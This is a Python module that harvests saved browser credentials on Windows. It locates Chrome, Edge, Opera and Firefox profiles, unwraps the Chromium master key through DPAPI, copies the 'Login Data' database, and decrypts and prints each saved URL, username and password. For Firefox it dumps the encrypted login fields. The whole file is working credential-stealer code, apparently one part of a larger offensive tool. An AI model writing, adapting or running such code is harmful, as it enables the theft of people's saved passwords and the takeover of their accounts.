import os
import json
import shutil
import sqlite3


def list_all_browsers():
    if os.name != 'nt':
        return '[-] Browser dump is Windows-only'
    local = os.environ.get('LOCALAPPDATA', '')
    appdata = os.environ.get('APPDATA', '')
    browsers = {
        'Chrome': os.path.join(local, r'Google\Chrome\User Data'),
        'Edge': os.path.join(local, r'Microsoft\Edge\User Data'),
        'Opera': os.path.join(appdata, 'Opera Software', 'Opera Stable'),
        'Firefox': os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles'),
    }
    installed = [n for n, p in browsers.items() if os.path.exists(p)]
    return '\n'.join(installed) if installed else '[-] No browsers found'


def dump_edge_v2():
    if os.name != 'nt':
        return '[-] Windows-only'
    path = os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data')
    return _chrome_dump(path, 'Edge') if os.path.exists(path) else '[-] Edge not found'


def dump_opera():
    if os.name != 'nt':
        return '[-] Windows-only'
    path = os.path.join(os.environ.get('APPDATA', ''), 'Opera Software', 'Opera Stable')
    return _chrome_dump(path, 'Opera') if os.path.exists(path) else '[-] Opera not found'


def dump_firefox():
    if os.name != 'nt':
        return '[-] Windows-only'
    profiles = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(profiles):
        return '[-] Firefox not found'
    result = ''
    for profile in os.listdir(profiles):
        logins = os.path.join(profiles, profile, 'logins.json')
        if not os.path.exists(logins):
            continue
        try:
            with open(logins, 'r', encoding='utf-8') as f:
                data = json.load(f)
            for entry in data.get('logins', []):
                result += '[Firefox] {}\n  -> {}:{}\n'.format(entry.get('hostname', ''), entry.get('encryptedUsername', ''), entry.get('encryptedPassword', ''))
        except Exception:
            continue
    return result.strip() or '[-] No Firefox credentials found'


def _chrome_dump(user_data_path, name):
    try:
        from Crypto.Cipher import AES
        import win32crypt
    except ImportError:
        return '[-] Missing dependencies (pycryptodome, pywin32)'
    local_state = os.path.join(user_data_path, 'Local State')
    if not os.path.exists(local_state):
        return f'[-] {name}: Local State not found'
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            state = json.load(f)
        key = win32crypt.CryptUnprotectData(state['os_crypt']['encrypted_key'], None, None, None, 0)[1]
    except Exception:
        return f'[-] {name}: key extraction failed'
    login_db = os.path.join(user_data_path, 'Default', 'Login Data')
    if not os.path.exists(login_db):
        login_db = os.path.join(user_data_path, 'Login Data')
        if not os.path.exists(login_db):
            return f'[-] {name}: Login Data not found'
    temp_db = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), f'{name}_temp.db')
    result = ''
    try:
        shutil.copy2(login_db, temp_db)
        with sqlite3.connect(temp_db) as conn:
            for url, username, enp in conn.execute(
                'SELECT origin_url, username_value, password_value FROM logins'):
                if not username or not enp:
                    continue
                try:
                    cipher = AES.new(key, AES.MODE_GCM, enp[3:15])
                    password = cipher.decrypt(enp[15:])[:-16].decode()
                    result += f'[{name}] {url}\n  -> {username}:{password}\n'
                except Exception:
                    continue
    except Exception:
        pass
    finally:
        try:
            os.remove(temp_db)
        except OSError:
            pass
    return result.strip() or f'[-] No {name} credentials found'
